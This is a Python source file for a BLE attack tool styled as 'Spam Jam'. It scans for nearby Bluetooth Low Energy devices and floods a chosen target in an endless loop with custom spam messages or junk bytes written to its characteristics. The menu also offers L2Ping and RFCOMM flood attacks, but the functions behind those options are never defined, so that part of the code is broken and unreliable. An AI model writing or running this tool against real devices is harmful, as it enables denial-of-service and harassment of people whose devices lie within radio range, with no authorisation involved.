import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, BTLEException

# 🎨 Spam Jam & Party Pooper Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 Spam Jam BLE Edition 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with Party Pooper + Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🚀 BLE Spamming with User Input!
def spam_ble(target_mac):
    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()  # User input!

    try:
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
        peripheral.setDelegate(BLESpam())
        while True:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
    except Exception as e:
        print(f"⚠️ Error: {e}")

# 🎯 FIXED BLE Jamming Function!
def jam_ble():
    """Scan & jam a BLE device."""
    print("🔎 Scanning for BLE devices to jam 📡")
    scanner = Scanner()
    devices = scanner.scan(10.0)

    # Store devices as a list instead of dict_values
    device_list = list(devices)

    for idx, device in enumerate(device_list):
        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    if not device_list:
        print("⚠️ No BLE devices found. Try again!")
        return

    try:
        device_idx = int(input("💜 Enter the index of the device to jam: "))
        target_device = device_list[device_idx].addr  # FIXED!
    except (ValueError, IndexError):
        print("⚠️ Invalid index. Please enter a valid number!")
        return

    print(f"💥 Jamming device {target_device} 🚀💜")
    try:
        peripheral = Peripheral(target_device)
        while True:
            junk_data = b'\x00\xFF' * 50
            peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
            print(f"🚀 Jammed {target_device} with noise 💜💥")
            time.sleep(0.1)
    except BTLEException as e:
        print(f"⚠️ Failed to jam {target_device}: {e}")

# 🏁 Main Function: Choose Feature
def main():
    print_banner()
    print("🔹 1️⃣ Spam a BLE device 💌")
    print("🔹 2️⃣ Jam a BLE device 🚫")
    print("🔹 3️⃣ Scan for Bluetooth devices 📡")
    print("🔹 4️⃣ L2Ping Attack 💥 (Now customizable!)")
    print("🔹 5️⃣ RFCOMM Connection Flood 💥")
    print("🔹 6️⃣ Start Bluetooth Service 📡")
    print("🔹 7️⃣ Quit 🚪")

    choice = input("💜 Choose an option (1-7): ")
    
    if choice == "1":
        target_mac = input("💜 Enter target BLE MAC address: ")
        spam_ble(target_mac)
    elif choice == "2":
        jam_ble()
    elif choice == "3":
        scan_bluetooth()
    elif choice == "4":
        l2ping_attack()
    elif choice == "5":
        rfcomm_flood()
    elif choice == "6":
        start_bluetooth()
    elif choice == "7":
        print("👋 Goodbye, fren! XOXOXO 💜")
        sys.exit()
    else:
        print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
